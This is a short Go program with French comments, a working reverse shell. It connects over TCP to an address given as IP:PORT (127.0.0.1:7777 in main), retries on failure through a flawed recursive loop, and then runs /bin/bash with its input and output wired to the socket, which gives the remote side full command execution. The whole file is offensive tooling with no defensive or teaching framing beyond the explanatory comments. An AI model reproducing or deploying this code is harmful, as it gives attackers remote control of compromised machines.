package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"time"
)

/*
La fonction shell est ici pour faire du reverse shell, le parametre de la fonction est au format IP:PORT
*/
func shell(host string) {

	stderr := os.Stderr
	stdout := os.Stdout

	conn, err := net.Dial("tcp", host) // appell TCP sur l'ip:port
	if err != nil {                    // verification des erreurs
		if nil != conn {
			conn.Close() // ferme la connexion si err == nil et que la connexion est initialisee, permet de fermer proprement
		}
		for i := 1; i <= 5; i++ { // la boucle ici pernet de relancer une connexion si cela echoue 5 tentatives avant de fermer la connexion
			fmt.Fprintf(stderr, "ERREUR - Connexion a l'hote impossible\n")
			time.Sleep(5 * time.Second)
			shell(host)
		}
		fmt.Fprintf(stderr, "ECHEC - Connexion a l'hote impossible apres 5 essais\n")
		os.Exit(1) // EXIT == 1 - Exit avec erreur
	}
	fmt.Fprintf(stdout, "Connexion Reussie\n")

	sh := exec.Command("/bin/bash")                   // Execution d'un shell Bash
	sh.Stdin, sh.Stdout, sh.Stderr = conn, conn, conn // multiples affectations des Std{in,out,err} aux pointeur conn pour tout rediriger dans le socket
	sh.Run()                                          // execution du shell avec les redirections ci-dessus

	conn.Close() // fermeture de la connexion lorsque le shell se ferme

	fmt.Fprintf(stdout, "Connexion Fermee\n")
	os.Exit(0) // EXIT == 0 - Exit sans erreur

}

func main() {

	shell("127.0.0.1:7777")

}
